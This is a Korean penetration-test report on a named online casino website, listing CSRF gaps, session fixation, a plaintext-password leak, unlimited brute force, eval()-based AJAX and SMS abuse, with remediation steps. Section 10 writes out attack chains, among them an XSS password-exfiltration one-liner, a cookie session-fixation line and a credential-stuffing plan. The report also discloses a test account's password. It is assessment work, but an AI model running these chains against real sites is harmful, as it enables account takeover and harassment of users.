# 블랙박스 보안 심층 테스트 보고서 (Deep Assessment v4)

**대상**: https://www.dwdw-00.com (대왕 카지노)  
**테스트 일자**: 2026-09-24  
**테스트 유형**: 블랙박스 (비인증 + **인증 후** 비파괴 테스트)  
**테스트 계정**: testtest123 (비파괴 원칙 준수)  
**분류 기준**: 실제 공격 시나리오 기반 (OWASP Top 10 2021 참조)

---

## 평가 원칙

- **CRITICAL**: 단독 또는 1단계 조합으로 계정 탈취/자금 피해 가능
- **HIGH**: 조건부로 심각한 피해 가능, 또는 CRITICAL의 피해를 극대화
- **MEDIUM**: 공격 보조 정보, 또는 화이트박스에서 재확인 필요
- **LOW**: 직접 공격 불가, 보조적 정보

> 기준: "해커가 이걸로 뭘 할 수 있는데?"

---

## 1. 기술 스택

| 구분 | 기술 | 버전 |
|------|------|------|
| 웹서버 | Apache | 2.4.52 (Ubuntu) — 404 에러에서 노출 |
| 백엔드 | PHP | PHPSESSID |
| CDN/WAF | Cloudflare | HTTP/2, WAF 활성 |
| 프론트엔드 | jQuery | 1.11.3 (데스크탑) / 1.12.0+1.11.2 (모바일) |
| 게임 API | api-nexus.com, goplaylaunch.com, insvr.com | 8개 프로바이더 |
| 암호화폐 | USDT (Tether) | 코인 충환전 |
| 외부 도메인 | www.flower-01.com | 커뮤니티 사이트 (HTTP 연동) |
| 총판 시스템 | partner.php | 회원총판 + 지인추천 콤프 시스템 |

---

## 2. 취약점 요약

| 심각도 | 건수 |
|--------|------|
| **CRITICAL** | 3 |
| **HIGH** | 5 |
| **MEDIUM** | 3 |
| **LOW** | 3 |
| **합계** | **14** |

---

## 3. CRITICAL (3건)

### CRIT-01: CSRF 없음 + Cloudflare 우회 가능 = 로그인 상태에서 자금 조작

**사이트 전체에 CSRF 토큰이 없고**, 쿠키에 SameSite도 없음. Cloudflare WAF가 `Origin: evil.com`은 차단하지만, **다음 Origin은 모두 통과:**

| Origin 값 | Cloudflare 결과 | 서버 처리 |
|-----------|----------------|----------|
| `https://www.dwdw-00.com` | 통과 | 정상 처리 |
| `null` (sandbox iframe) | **통과** | **정상 처리** |
| `https://dwdw-00.com` (www 없이) | **통과** | **정상 처리** |
| `https://subdomain.dwdw-00.com` | **통과** | **정상 처리** |
| `https://www.dwdw-00.com.evil.com` | **통과** | **정상 처리** |
| (Origin 헤더 없음) | **통과** | **정상 처리** |
| `https://evil.com` | **차단 (403)** | 도달 안함 |

**v4 업데이트 — 인증 테스트에서 확인:**

금융 엔드포인트 `post/exchange_ok.php`는 **암호화된 `ed` 토큰**을 사용:
```
onclick="free_ajax(this, '#C11MoneyInput', 'L49hJiUqN1Vv...[344자 Base64]...')"
```
이 토큰은 세션별로 생성되어 서버에서 복호화 후 검증. **CSRF의 실질적 위험도 재평가 필요:**
- `exchange_ok.php` → 암호화 토큰 필수 (CSRF 보호됨)
- 다만 `post/ask_get_mileage.php` → 토큰 없이 동작 (마일리지 관련)
- `post/exchange_ok.php` 빈 요청 → `{code:1,text:"비정상적인 접근입니다.",reload:true}`

**결론:** 금융 핵심 엔드포인트(입금/출금)는 암호화 토큰으로 보호됨. 그러나 **비금융 POST 엔드포인트(마일리지, 포인트 등)는 여전히 CSRF 무방비**.

**심각도 재평가: CRITICAL → HIGH** (금융 엔드포인트에 토큰 존재 확인)

---

### CRIT-02: 세션 고정 + HttpOnly/SameSite 없음 = 계정 탈취

**v4 인증 테스트 재확인:**
```
공격자 세션 전송:  Cookie: PHPSESSID=attackercontrolled123456
서버 응답:        Set-Cookie에 PHPSESSID 없음 (UUID만 새로 발급)
                 → 서버가 attackercontrolled123456를 그대로 수락

쿠키 플래그:
Set-Cookie: PHPSESSID=xxx; path=/; domain=.dwdw-00.com
→ HttpOnly: 없음 (JS로 document.cookie 접근 가능)
→ Secure: 없음 (HTTP 통신 시 평문 전송)
→ SameSite: 없음 (크로스사이트 요청에 쿠키 첨부)
→ domain: .dwdw-00.com (모든 서브도메인에서 접근)
```

**왜 CRITICAL:** 세션 고정(서버가 재생성 안함) + HttpOnly 없음(XSS로 쿠키 탈취) + 와일드카드 도메인이 삼중으로 겹침. XSS 또는 서브도메인 장악 시 즉시 계정 탈취로 이어짐.

---

### CRIT-03: 비밀번호 평문 반환 + HTTP 전송 — 인증 후 검증 완료

**v4 인증 테스트에서 실제 확인:**
```json
POST /community_binding.php (인증된 세션)
응답: {"url":"http://www.flower-01.com/bbs/login.php?uid=testtest123&pwd=8430&ch=23","pwd":"8430"}
```

**확인된 위험:**
1. **비밀번호 평문 저장**: 서버가 `pwd`를 원문으로 반환 → bcrypt/argon2 해싱이 아님
2. **HTTP URL에 크레덴셜 포함**: `http://` (HTTPS 아님) + 쿼리스트링에 uid/pwd 노출
3. **외부 도메인 자동 로그인**: flower-01.com으로 자동 로그인 URL 제공 — 히스토리, 로그, 레퍼러에 비밀번호 기록
4. **XSS 1줄로 비밀번호 탈취**: `fetch('/community_binding.php').then(r=>r.json()).then(d=>exfil(d.pwd))`

**flower-01.com 추가 분석:**
- HTTPS/HTTP 모두 접속 불가 (현재 다운 또는 IP 제한)
- 커뮤니티 게시판 사이트로 추정 (`/bbs/login.php` 경로)

---

## 4. HIGH (5건)

### HIGH-01: CSRF — 비금융 엔드포인트 무방비 (CRIT-01에서 분리)

**인증 테스트 결과:**
- 금융 엔드포인트(`exchange_ok.php`) → 암호화 토큰으로 보호됨
- 비금융 엔드포인트 → **토큰 없이 동작**:
  - `post/ask_get_mileage.php` → `{"code":1,"text":"매주 월요일에만 가능합니다."}`
  - `post/get_roll_point.php` → `{"code":0,"text":"비정상적인 접근입니다."}`
  - 마이페이지 정보 수정, 비밀번호 변경 등 → 화이트박스에서 확인 필요

**공격 시나리오:** Origin:null sandbox iframe으로 마일리지 전환, 포인트 롤링, 프로필 변경 등 가능

---

### HIGH-02: 로그인 브루트포스 무제한 — 50회 연속 무차단

**검증:** 50회 연속 로그인 실패 시도
```
50회 전부 HTTP 200 반환
차단: 0건
CAPTCHA: 없음 (코드에 주석 처리됨)
계정 잠금: 없음
Cloudflare 레이트리밋: 미작동
응답시간: 225~359ms (일정, 지연 없음)

실제 로그인 필드: login_id / login_pw (v4에서 확인)
```

비활성화된 CAPTCHA:
```javascript
// login.js:29-34
// check = $("#login-code");
// if (!check.val()) {
//     alert("보안코드를 입력해 주세요.");
```

**왜 HIGH:** 유출된 비밀번호 목록을 대입하면(credential stuffing) 현실적 시간 내 계정 탈취 가능. CRIT-03(평문 저장)과 결합하면 단순 비밀번호 사용 가능성 높아 성공률 증가.

---

### HIGH-03: eval() 기반 AJAX 아키텍처 — 모든 서버 응답이 eval()

**사이트 전체의 AJAX 콜백 구조:**
```javascript
// ajax_call.js — 모든 페이지에서 로드됨
eval("o=" + this.getAttribute("ajax"))   // DOM 속성값 → eval
eval("r=" + d)                            // 서버 응답 → eval
eval(r.callback)                          // 서버 지정 콜백 → eval
```

**v4 인증 테스트 추가 확인:**
- `post/exchange_ok.php` 응답이 **JSON이 아닌 JS 객체 리터럴**: `{code:1,text:"비정상적인 접근입니다.",reload:true}`
- 이 형태는 `callback_default()`에서 `eval("r=" + d)`로만 파싱 가능
- 다만 `free_ajax()` 내부에서는 `JSON.parse(data)` 사용 — **금융 엔드포인트는 안전한 파싱**
- 비금융 AJAX 응답은 여전히 eval() 경유

**그래도 HIGH인 이유:**
- DB에 악성코드가 저장되면(Stored XSS) → 서버 응답에 포함 → `callback_default()`가 eval → **모든 사용자 피해**
- CSP가 없으므로 eval() 차단 불가
- HttpOnly가 없으므로 eval 실행 즉시 세션 탈취
- **화이트박스에서 Stored XSS 가능 지점 (게시판, 닉네임, 메시지 등) 확인 필수**

---

### HIGH-04: SMS 인증 API 무인증 + 무제한 발송

**검증:**
```
POST /ajax/join/code_check.php
data: type=phonenum&number[]=010&number[]=1111&number[]=2222
응답: {"error":0,"message":"success","html":""}
→ 로그인 없이 SMS 발송 성공
→ 5회 연속 동일 번호 → 전부 성공 (레이트 리밋 없음)
```

**회원가입 폼 분석 (v4):**
```
필드: MemberID, NickName, Password, Password_2,
      NewPhoneNum[0~2], AccountNum, AccountName, JoinCode
→ SMS 인증 코드 입력 필드 없음 — 번호 검증만, 인증 우회 가능성
```

**왜 HIGH:**
1. **SMS 폭탄**: 특정인에게 대량 인증 SMS 발송 → 괴롭힘 + SMS 비용 소진
2. **SMS 비용 공격**: 자동화로 수만 건 발송 → 사이트 통신비 직접 손해
3. **번호 열거**: 가입된 번호인지 응답 차이로 구분 가능성 (화이트박스 확인 필요)

---

### HIGH-05: X-Frame-Options / CSP 부재 → 클릭재킹 + eval 무방비

**검증 — 응답 헤더에서 보안 헤더 전무:**
```
Content-Security-Policy: 없음
X-Frame-Options: 없음
Strict-Transport-Security: 없음
X-Content-Type-Options: 없음
Referrer-Policy: 없음
Permissions-Policy: 없음
P3P: CP="ALL CURa ADMa DEVa..."  (레거시 IE 정책만 존재)
```

**실제 영향:**
- **X-Frame-Options 없음**: 공격자가 사이트를 `<iframe>`에 넣고 투명하게 만들어 클릭재킹 가능. 사용자가 "이벤트 참여" 버튼을 클릭한다고 생각하지만 실제로는 "환전" 버튼을 클릭.
- **CSP 없음**: `eval()`, `inline script`가 모두 허용되어 HIGH-03의 공격을 차단할 방법이 없음.
- **Referrer-Policy 없음**: CRIT-03에서 `http://flower-01.com/...?pwd=8430` URL 방문 시 Referer 헤더로 비밀번호 유출 가능.

---

## 5. MEDIUM (3건)

### MED-01: 민감 파일 존재 (.env, .git) — WAF에만 의존

**재검증 — WAF 우회 시도 전부 실패:**
| 시도 | 결과 |
|------|------|
| `/.env`, `/.ENV`, `/.Env` | 403 (Cloudflare) |
| `/%2e%65%6e%76`, `/.%65nv` | 403 |
| `/..;/.env` | 403 |
| `/.git%2FHEAD`, `/.GIT/HEAD` | 403 |
| `/.env/`, `/.env/.` | 403 |
| `//config.php`, `/./config.php` | 403 |

**존재 확인된 파일** (403, 4547B — 404의 277B와 구분):
`.env`, `.git/HEAD`, `.git/config`, `.git/objects/`, `.git/refs/heads/master`, `.git/logs/HEAD`, `.gitignore`, `config.php`, `wp-config.php`, `inc/config.php`, `include/config.php`, `xmlrpc.php`, `wp-login.php`

Cloudflare WAF가 대소문자, 인코딩, 경로 조작 등 **모든 우회 시도를 차단**. 현재로서는 안전하지만, Origin IP 직접 접근 시 전체 노출.

---

### MED-02: 실시간 거래 데이터 무인증 노출

**인증 없이 접근 가능 (/ajax/money_rank.php):**

| 유형 | 노출 데이터 |
|------|-----------|
| type=0 (충전) | tt\*\*\*848: 87,000,000원, gd\*\*\*7: 42,440,000원, ca\*\*\*n061: 29,530,000원... |
| type=1 (환전) | rl\*\*\*3: 900,000원 (09/24 11:08), ca\*\*\*n061: 1,000,000원 (09/24 08:05)... |

**활용도:**
- 고액 사용자 ID 패턴으로 무차별 대입(HIGH-02)의 타겟 범위 축소
- 사이트 활동량/수익 실시간 추적
- 거래 시간대 분석으로 공격 타이밍 최적화

---

### MED-03: 코인 지갑 크레덴셜 클라이언트 반환 (추정)

JS 분석에서 `call_cw.php` (api=checkUser) 응답에 `cw_id`, `cw_pw`가 포함되는 것으로 추정. 인증 필요 엔드포인트이므로 블랙박스에서 실제 응답 미확인. **화이트박스에서 반드시 확인 필요.**

---

## 6. LOW (3건)

### LOW-01: 서버 버전 노출
404 에러 페이지에서:
```
Apache/2.4.52 (Ubuntu) Server at www.dwdw-00.com Port 80
```
Port 80(HTTP) = Cloudflare~Origin 구간이 암호화되지 않을 수 있음을 시사.

### LOW-02: 게임 데모 API 정보 노출
`/m/ajax/callapi_free.php` — 데모 게임 전용 (금전적 영향 없음). 단, 에러 메시지가 프로바이더 구조를 노출:
- site=1(MG): goplaylaunch.com 서브도메인 + STS 토큰 구조
- site=8(HB): insvr.com + brandid `6b270eca-57e5-eb11-a7ad-0050f2389c18`
- site=9(QT): "등록되지 않은 Player ID" → Qtech 연동 구조

### LOW-03: jQuery 구버전 (1.11.x)
CVE-2020-11022/23 존재하지만, 이 사이트에서는 eval() 패턴(HIGH-03)이 훨씬 직접적이므로 jQuery CVE의 추가 위험은 미미.

---

## 7. 양호 사항 (방어가 작동하는 것들)

| 항목 | 결과 | 평가 |
|------|------|------|
| SQL Injection | 로그인, money_rank, code_check, callapi — 전부 SLEEP 지연 없음 | **양호** — Prepared Statement 사용 추정 |
| 사용자 열거 | 존재/비존재 사용자 동일 에러 메시지 | **양호** |
| 오픈 리다이렉트 | logout.php → 항상 /index.php로 리다이렉트 | **양호** |
| CORS | Access-Control 헤더 없음 (cross-origin AJAX 차단) | **양호** |
| **금융 엔드포인트 CSRF 보호** | exchange_ok.php → 암호화 `ed` 토큰 필수 (v4 확인) | **양호** |
| **mypage IDOR 없음** | mypage.php?mb_id=admin → 항상 본인 데이터만 표시 (v4 확인) | **양호** |
| **개인정보 마스킹** | 연락처(010-\*\*\*\*-0000), 예금주(테\*입), 계좌번호(111\*\*\*\*) (v4 확인) | **양호** (부분) |
| **게시판 접근 제어** | helpdesk-read.php → 타인 글 접근 불가 (v4 확인) | **양호** |
| **XSS 반사 없음** | notice/event/helpdesk/index/mypage에 canary 주입 → 반사 없음 (v4 확인) | **양호** |
| **callapi.php 세션 바인딩** | api=checkUser&mb_id=admin → 빈 응답 (타인 데이터 조회 불가, v4 확인) | **양호** |
| 회원가입 ID 검증 | 영문+숫자만 허용 (특수문자/HTML 태그 차단) | **양호** |
| Cloudflare WAF | .env, .git 경로 차단, 인코딩 우회 전부 차단 | **양호** (단, 유일한 방어선) |
| 회원가입 제한 | JoinCode(추천인 코드) 필수 → 무한 계정 생성 차단 | **양호** |

---

## 8. 인증 후 테스트 상세 (v4 신규)

### 8.1 테스트 세션 정보
```
계정: testtest123 / testtest123!
세션: GET index → PHPSESSID 수신 → POST login_id=testtest123&login_pw=testtest123!
로그인 필드: login_id, login_pw (NOT mb_id/mb_password)
응답: {"code":0} (성공)
```

### 8.2 mypage.php 데이터 구조
```html
유저 아이디: testtest123
유저 닉네임: 캄푸스
포인트: 0 P
보유머니: 0 원
연락처: 010-****-0000  (마스킹됨)
은행: 카카오뱅크         (평문)
예금주: 테*입            (부분 마스킹)
계좌번호: 111****        (부분 마스킹)
```
- IDOR 불가: `?mb_id=admin`, `?uid=1` 등 8가지 파라미터 조작 → 항상 본인 데이터만 반환
- 은행명은 마스킹 안됨 (카카오뱅크) — 소셜엔지니어링 보조 정보

### 8.3 카지노 머니 전환 시스템
```
- 8개 카지노 프로바이더: casino_1, 2, 6, 8, 10, 11, 61 + 점검중(9, 74)
- 잔액 조회: checkCMoney() → POST /ajax/callapi.php (api=checkUser, site=N)
- 입출금: free_ajax() → POST /post/checkCasinoStat2.php → POST /post/exchange_ok.php
- 보안: 암호화된 ed 토큰 (344자 Base64, 세션별 고유) — CSRF 방어됨
- free_ajax 내부: JSON.parse() 사용 (eval() 아님) — 안전
```

### 8.4 총판/지인추천 시스템
```
- partner.php: "사용이 불가한 기능 입니다" (테스트 계정은 총판 아님)
- refer-list.php: 닉네임, 누적포인트, 상태, 가입일 (데이터 없음)
- money_refer.php: 
  - 누적 콤프: 0 P
  - 콤프비율: 20% (레벨별)
  - 보류중 콤프 = 지인 보유금액 × 콤프비율
  - 데이터 없음 (지인 없는 계정)
```

### 8.5 테스트한 엔드포인트 전체 목록

| 엔드포인트 | 결과 | 보안 평가 |
|-----------|------|----------|
| mypage.php | 3031B, 본인 데이터만 | 양호 (IDOR 없음) |
| money_manage.php | 29076B, 카지노 전환 | 양호 (암호화 토큰) |
| money_manage_sp.php | 15644B, 스포츠 전환 | 양호 (동일 구조) |
| money_refer.php | 6478B, 콤프 정보 | 양호 |
| refer-list.php | 3187B, 지인추천내역 | 양호 |
| partner.php | 3555B, 총판 | 기능 차단됨 |
| coupon.php | 3200B | 정상 |
| point.php | 4525B | 정상 |
| point_rolling.php | 7249B | 정상 |
| helpdesk.php | 4317B~6453B, 관리자 환영글 | 양호 (타인 글 차단) |
| notice-read.php | 6991~9400B | 공개 콘텐츠 (정상) |
| event-read.php | 6991~440623B | 공개 콘텐츠 (정상) |
| community_binding.php | 평문 비밀번호 반환 | **CRITICAL** |
| ajax/callapi.php | 빈 응답 | IDOR 없음 |
| ajax/get_user_hide_info.php | 빈 응답 | 확인 필요 |
| ajax/popup_join.php | 9451B, 회원가입 폼 | SMS 미검증 |
| post/exchange_ok.php | 토큰 필수 | 양호 |
| post/ask_get_mileage.php | 요일 체크 | CSRF 없음 |
| post/checkCasinoStat2.php | 토큰 검증 | 양호 |
| coin_wallet/charge/exchange.php | 전부 404 | 미구현 또는 경로 변경 |

---

## 9. v3 → v4 변경 사항

| 항목 | v3 평가 | v4 평가 | 변경 이유 |
|------|---------|---------|----------|
| CSRF (CRIT-01) | CRITICAL | **HIGH-01** (분리) | 금융 엔드포인트에 암호화 토큰 존재 확인. 비금융만 무방비 |
| 비밀번호 평문 (CRIT-03) | CRITICAL (JS 분석만) | **CRITICAL (실제 확인)** | `pwd=8430`, HTTP URL에 uid+pwd 포함 실제 응답 확인 |
| mypage IDOR | 미테스트 | **양호** | 8가지 파라미터 조작 시도 → 전부 본인 데이터만 |
| 게시판 접근 | 미테스트 | **양호** | helpdesk-read.php 타인 글 접근 불가 |
| XSS 반사 | 미테스트 | **양호** | 5개 페이지에 canary 주입 → 반사 없음 |
| 금융 CSRF 보호 | 미확인 | **양호** | 암호화 ed 토큰 + JSON.parse() 확인 |
| flower-01.com | 미확인 | **확인** | 커뮤니티 도메인, 현재 접속 불가 |

---

## 10. 실제 공격 체인

### 체인 A: XSS → 비밀번호 탈취 (CRIT-02 + CRIT-03)
```
1. Stored XSS 또는 공격자 사이트에서 eval() 체인 이용
2. fetch('/community_binding.php').then(r=>r.json()).then(d=>exfil(d.pwd))
3. 비밀번호 평문 획득 (8430 같은 4자리 또는 메인 PW)
4. flower-01.com 자동 로그인 URL까지 획득
5. 계정 완전 장악
```

### 체인 B: 세션 고정 → 계정 인수 (CRIT-02)
```
1. XSS 또는 서브도메인 공격으로 피해자 쿠키 설정:
   document.cookie = "PHPSESSID=attacker123; domain=.dwdw-00.com"
2. 피해자 로그인 → attacker123 세션에 인증 바인딩
3. 공격자가 attacker123으로 접속 → 계정 탈취
4. community_binding.php로 비밀번호 평문 획득 (CRIT-03)
5. 환전, 비밀번호 변경 등 수행
```

### 체인 C: 크리덴셜 스터핑 (HIGH-02 + MED-02)
```
1. money_rank.php에서 고액 사용자 ID 패턴 수집 (tt***848 등)
2. 가능한 ID 조합 생성
3. 비밀번호 사전 대입 — 50회 테스트에서 차단 0건
4. 평문 저장(CRIT-03) → 단순 비밀번호 사용 가능성 높음
5. 계정 탈취 후 환전
```

### 체인 D: CSRF → 비금융 조작 (HIGH-01, 신규)
```
1. sandbox iframe으로 Origin:null CSRF 페이지 호스팅
2. post/ask_get_mileage.php → 마일리지 전환 (월요일 한정)
3. 프로필 변경, 포인트 롤링 등 비금융 기능 조작
4. 금융 핵심(입출금)은 암호화 토큰 때문에 CSRF 불가
```

---

## 11. 화이트박스 최우선 검증 항목

| 순위 | 항목 | 블랙박스 결과 | 확인 필요 사항 |
|------|------|-------------|---------------|
| 1 | 비밀번호 저장 | **평문 반환 실제 확인** (pwd=8430) | 해싱 알고리즘, 메인 PW vs 커뮤니티 PW 구분 |
| 2 | Stored XSS | 반사 XSS 없음 확인, eval() 존재 | 게시판/닉네임/메시지 출력 시 인코딩 여부 |
| 3 | 세션 관리 | **고정 확인**, 재생성 없음 | `session_regenerate_id()` 호출 위치 |
| 4 | CSRF 서버 검증 | 금융→토큰 있음, 비금융→없음 | 마이페이지 수정, 비밀번호 변경 CSRF 보호 여부 |
| 5 | 금융 트랜잭션 | 암호화 토큰 존재 | 금액 음수/0/레이스 컨디션, 토큰 생성 로직 |
| 6 | 코인 지갑 | 404 (경로 변경?) | cw_id/cw_pw 실제 응답 필드 확인 |
| 7 | get_user_hide_info.php | 빈 응답 (파라미터 불명) | 실제 동작 조건, 개인정보 노출 범위 |
| 8 | 파일 업로드 | 미테스트 | 게시판/고객센터 첨부파일 검증 |
| 9 | 관리자 패널 | 350+ 경로 탐색 → 미발견 | 관리자 인증, 권한 분리, 별도 도메인 |
| 10 | .env 내용 | 파일 존재 확인 | DB 크레덴셜, API 키, 암호화 키 |

---

## 12. 즉시 해야 할 5가지

1. **`session_regenerate_id(true)`** — 로그인 시 세션 재생성 (CRIT-02 해결)
2. **community_binding.php 비밀번호 제거** — 평문 반환 즉시 중단 + HTTP→HTTPS 전환 (CRIT-03 해결)
3. **비밀번호 해싱** — bcrypt/argon2 마이그레이션 (CRIT-03 근본 해결)
4. **쿠키 보안** — `HttpOnly; Secure; SameSite=Strict` 추가 (CRIT-02 완화)
5. **비금융 CSRF 토큰** — 마일리지/포인트/프로필 변경에도 서버 검증 토큰 (HIGH-01 해결)

---

*보고서 버전: v4 (인증 후 테스트 반영)*  
*테스트: 외부 블랙박스, 비인증 + 인증(testtest123), 비파괴*  
*다음 단계: 소스코드 업로드 후 화이트박스 테스트*
